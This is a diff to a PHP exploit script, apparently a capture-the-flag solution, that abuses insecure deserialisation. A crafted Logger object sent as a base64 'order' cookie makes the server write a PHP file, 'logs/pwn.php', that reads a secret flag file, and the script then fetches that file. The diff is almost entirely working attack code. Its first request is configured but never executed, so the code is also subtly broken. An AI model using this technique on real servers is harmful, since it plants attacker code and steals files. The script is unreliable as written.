@@ -10,9 +10,34 @@ class Logger {
     $this->logFile = "logs/pwn.php";
     $this->endMessage = "<?php echo file_get_contents('../.htflag');";
   }
+
+  public function getLogFile() {
+    return $this->logFile;
+  }
 }
 
 $l = new Logger();
 
-#echo serialize($l), "\n";
-echo base64_encode(serialize($l)), "\n";
+$order = base64_encode(serialize($l));
+
+echo "Payload:\norder={$order}\n";
+
+
+// Auto-fetch
+$target = 'http://localhost:8080/';
+
+// Exploit the application
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, $target);
+curl_setopt($curl, CURLOPT_HTTPHEADER, array("Cookie: order={$order}"));
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, false);
+curl_close($curl);
+
+// Get the flag
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, $target . '/' . $l->getLogFile());
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+$content = curl_exec($curl);
+curl_close($curl);
+
+echo "\n\n -- Flag: ", $content, "\n\n";
